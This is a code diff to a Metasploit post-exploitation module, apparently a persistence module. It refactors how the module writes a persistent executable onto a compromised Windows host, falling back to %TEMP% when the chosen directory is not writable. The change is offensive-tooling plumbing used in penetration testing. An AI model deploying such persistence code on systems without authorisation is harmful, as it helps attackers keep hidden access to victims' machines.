@@ -170,33 +170,34 @@ class MetasploitModule < Msf::Post
   # Function for writing executable to target host
   #-------------------------------------------------------------------------------
   def write_exe_to_target(rexe, rexename)
-    if not datastore['LocalExePath'].nil?
-    # check we have write permissions
+    # check if we have write permission
     # I made it by myself because the function filestat.writable? was not implemented yet.
-      testfile = datastore['LocalExePath'] + "\\" + Rex::Text.rand_text_alpha(rand(8) + 8)
-      fd = session.fs.file.new(testfile,"w")
-      if fd
-        fd.close
-        session.fs.file.rm(testfile)
-        tempdir = datastore['LocalExePath']
-      else
-        print_warning("Insufficient privileges to write in  #{datastore['LocalExePath']}")
+    if not datastore['LocalExePath'].nil?
+      
+      begin 
+        temprexe = datastore['LocalExePath'] + "\\" + rexename
+        write_file_to_target(temprexe,rexe)
+      rescue Rex::Post::Meterpreter::RequestError 
+        print_warning("Insufficient privileges to write in #{datastore['LocalExePath']}, writing to %TEMP%")
+        temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
+        write_file_to_target(temprexe,rexe)
       end
 
-    # Write to %temp% directory if not writable or not set LocalExePath
+    # Write to %temp% directory if not set LocalExePath
     else
-      tempdir = session.fs.file.expand_path("%TEMP%")
+      temprexe = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
+      write_file_to_target(temprexe,rexe)
     end
-
-    temprexe = tempdir + "\\" + rexename
-
-    fd = session.fs.file.new(temprexe, "wb")
-    fd.write(rexe)
-    fd.close
 
     print_good("Persistent Script written to #{temprexe}")
     @clean_up_rc << "rm #{temprexe}\n"
     temprexe
+  end
+
+  def write_file_to_target(temprexe,rexe)
+    fd = session.fs.file.new(temprexe, "wb")
+    fd.write(rexe)
+    fd.close
   end
 
   # Function to create executable from a file
